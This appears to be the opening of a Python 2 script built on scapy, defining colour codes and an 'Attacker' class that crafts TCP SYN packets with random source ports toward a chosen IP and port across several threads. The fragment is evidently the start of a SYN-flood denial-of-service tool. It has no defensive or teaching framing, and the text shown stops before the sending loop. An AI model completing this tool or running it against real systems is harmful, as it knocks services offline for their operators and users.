import socket
from scapy.all import *
from scapy.all import IP, TCP, send, sr1
import threading
import random
import time
import sys
from threading import Thread
from Queue import Queue

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class Attacker:
    def __init__(self, ip, port, threadnum):
        self.ip = ip
        self.port = port
        self.threadNum = threadnum
        self.packet = IP(dst=ip)/TCP(dport=port)
        self.packet.sport = random.randint(1024, 65535)
        self.packet.flags = 'S'

